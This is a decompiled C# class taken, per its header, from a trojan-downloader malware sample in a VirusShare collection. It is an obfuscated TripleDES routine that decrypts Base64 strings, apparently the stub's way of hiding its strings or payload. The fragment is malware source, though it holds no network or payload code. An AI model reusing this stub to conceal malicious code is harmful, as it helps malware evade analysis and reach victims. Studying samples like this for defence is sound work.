// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7761CAE9-D290-48D9-A44C-5C95C5289DD6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-Downloader.MSIL.VKont.a-ac18de4ecbb2a2d67066c2f262ee8f7a9d6a141b044780d493a970e6f8760975.exe

using \u0002;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0002
{
  internal class \u0004
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private TripleDESCryptoServiceProvider \u0001;
    private UTF8Encoding \u0001;
    private byte[] \u0001;
    private byte[] \u0002;

    public \u0004([In] byte[] obj0, [In] byte[] obj1)
    {
      this.\u0001 = new TripleDESCryptoServiceProvider();
      this.\u0001 = new UTF8Encoding();
      this.\u0001 = obj0;
      this.\u0002 = obj1;
    }

    public string \u0002([In] string obj0)
    {
      string str;
      try
      {
        str = this.\u0001.GetString(this.\u0002(Convert.FromBase64String(obj0), this.\u0001.CreateDecryptor(this.\u0001, this.\u0002)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) \u0004.\u0001(148));
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private byte[] \u0002([In] byte[] obj0, [In] ICryptoTransform obj1)
    {
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, obj1, CryptoStreamMode.Write);
      cryptoStream.Write(obj0, 0, obj0.Length);
      cryptoStream.FlushFinalBlock();
      memoryStream.Position = 0L;
      byte[] buffer = new byte[checked ((int) (memoryStream.Length - 1L) + 1)];
      memoryStream.Read(buffer, 0, buffer.Length);
      memoryStream.Close();
      cryptoStream.Close();
      return buffer;
    }

    static \u0004() => \u0001.\u0002.\u0002();
  }
}
